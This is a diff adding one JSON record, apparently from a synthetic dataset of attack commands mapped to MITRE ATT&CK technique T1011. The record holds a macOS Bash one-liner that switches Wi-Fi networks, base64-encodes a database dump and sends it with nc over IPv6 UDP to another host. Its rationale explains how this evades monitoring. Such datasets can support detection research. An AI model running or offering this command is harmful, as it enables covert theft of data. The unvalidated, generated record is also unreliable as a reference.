@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi\u2011Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi\u2011Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
